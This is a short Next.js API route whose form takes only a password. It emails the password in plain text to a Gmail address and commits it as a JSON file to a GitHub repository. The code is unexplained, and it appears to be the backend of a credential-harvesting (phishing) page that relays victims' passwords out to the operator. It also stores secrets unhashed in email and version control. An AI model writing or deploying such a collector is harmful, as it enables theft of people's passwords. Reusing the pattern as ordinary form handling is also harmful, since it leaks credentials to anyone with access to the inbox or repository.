// pages/api/submit.js
export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { password } = req.body;

  if (!password) {
    return res.status(400).json({ error: 'Password is required' });
  }

  const nodemailer = require('nodemailer');
  const { Octokit } = require('@octokit/rest');

  // Email setup
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS,
    },
  });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: 'New Form Submission',
    text: `Password: ${password}`,
  };

  // GitHub setup
  const octokit = new Octokit({
    auth: process.env.GITHUB_TOKEN,
  });

  const submission = {
    password,
    timestamp: new Date().toISOString(),
  };

  // Save to GitHub
  octokit.rest.repos
    .createOrUpdateFileContents({
      owner: process.env.GITHUB_OWNER,
      repo: process.env.GITHUB_REPO,
      path: `submissions/${Date.now()}.json`,
      message: 'Add new submission',
      content: Buffer.from(JSON.stringify(submission, null, 2)).toString('base64'),
    })
    .then(() => {
      // Send email
      transporter.sendMail(mailOptions, (error) => {
        if (error) {
          console.error('Email error:', error);
          return res.status(500).json({ error: 'Failed to send email' });
        }
        res.status(200).json({ message: 'Submission received' });
      });
    })
    .catch((err) => {
      console.error('GitHub error:', err);
      res.status(500).json({ error: 'Failed to save to GitHub' });
    });
}
